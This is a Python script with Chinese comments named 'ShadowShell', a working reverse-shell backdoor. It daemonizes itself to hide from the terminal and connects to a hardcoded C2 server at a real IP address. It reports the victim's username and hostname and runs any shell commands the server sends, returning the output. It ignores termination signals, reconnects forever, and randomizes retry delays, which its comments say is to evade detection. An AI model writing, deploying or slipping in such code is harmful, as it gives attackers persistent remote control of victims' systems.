#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ShadowShell 后台运行版本
自动转入后台，不占用终端
"""

import socket
import subprocess
import time
import sys
import os
import signal

def daemonize():
    """将进程转为守护进程(后台运行)"""
    try:
        # 第一次fork
        pid = os.fork()
        if pid > 0:
            # 父进程退出
            sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"Fork #1 failed: {e}\n")
        sys.exit(1)
    
    # 脱离父会话
    os.chdir("/")
    os.setsid()
    os.umask(0)
    
    # 第二次fork
    try:
        pid = os.fork()
        if pid > 0:
            # 父进程退出
            sys.exit(0)
    except OSError as e:
        sys.stderr.write(f"Fork #2 failed: {e}\n")
        sys.exit(1)
    
    # 重定向标准输入输出
    sys.stdout.flush()
    sys.stderr.flush()
    
    # 关闭标准输入输出
    with open('/dev/null', 'r') as f:
        os.dup2(f.fileno(), sys.stdin.fileno())
    with open('/dev/null', 'w') as f:
        os.dup2(f.fileno(), sys.stdout.fileno())
        os.dup2(f.fileno(), sys.stderr.fileno())

def connect_to_c2():
    """连接到C2服务器"""
    c2_ip = "209.38.64.150"
    c2_port = 5226
    retry_count = 50  # 增加重试次数
    retry_delay = 30  # 增加重试间隔
    
    for attempt in range(retry_count):
        try:
            # 创建socket连接
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((c2_ip, c2_port))
            
            # 发送初始信息
            hostname = os.uname().nodename if hasattr(os, 'uname') else "unknown"
            username = os.environ.get('USER', 'unknown')
            initial_msg = f"[ShadowShell] Connected from {username}@{hostname}\n"
            sock.send(initial_msg.encode())
            
            # 主循环
            while True:
                try:
                    # 接收命令
                    sock.settimeout(300)  # 5分钟超时
                    data = sock.recv(4096)
                    
                    if not data:
                        break
                    
                    command = data.decode().strip()
                    
                    if not command:
                        continue
                    
                    # 处理特殊命令
                    if command.lower() in ['exit', 'quit', 'bye']:
                        break
                    
                    if command.lower() == 'daemon_status':
                        result = f"Daemon running - PID: {os.getpid()}\n"
                        sock.send(result.encode())
                        continue
                    
                    # 执行命令
                    try:
                        result = subprocess.run(
                            command, 
                            shell=True, 
                            capture_output=True, 
                            text=True, 
                            timeout=60
                        )
                        
                        output = result.stdout + result.stderr
                        if not output:
                            output = "Command executed (no output)\n"
                        
                        # 分块发送大输出
                        for i in range(0, len(output), 4096):
                            chunk = output[i:i+4096]
                            sock.send(chunk.encode())
                        
                    except subprocess.TimeoutExpired:
                        error_msg = "Command timeout (60s)\n"
                        sock.send(error_msg.encode())
                    except Exception as e:
                        error_msg = f"Command error: {str(e)}\n"
                        sock.send(error_msg.encode())
                        
                except socket.timeout:
                    # 发送心跳包
                    try:
                        sock.send(b"")
                    except:
                        break
                    continue
                except Exception:
                    break
            
            sock.close()
            return True
            
        except Exception:
            pass
        
        # 后台重试，增加随机延迟避免检测
        import random
        actual_delay = retry_delay + random.randint(-10, 10)
        time.sleep(actual_delay)
    
    return False

def main():
    """主函数"""
    # 检查是否已经是守护进程
    if os.getppid() != 1:
        print("Starting ShadowShell daemon...")
        # 转为守护进程
        daemonize()
    
    # 忽略常见信号
    signal.signal(signal.SIGHUP, signal.SIG_IGN)
    signal.signal(signal.SIGTERM, signal.SIG_IGN)
    
    # 无限循环保持连接
    while True:
        try:
            connect_to_c2()
        except Exception:
            pass
        
        # 重启前等待
        time.sleep(60)

if __name__ == "__main__":
    main()
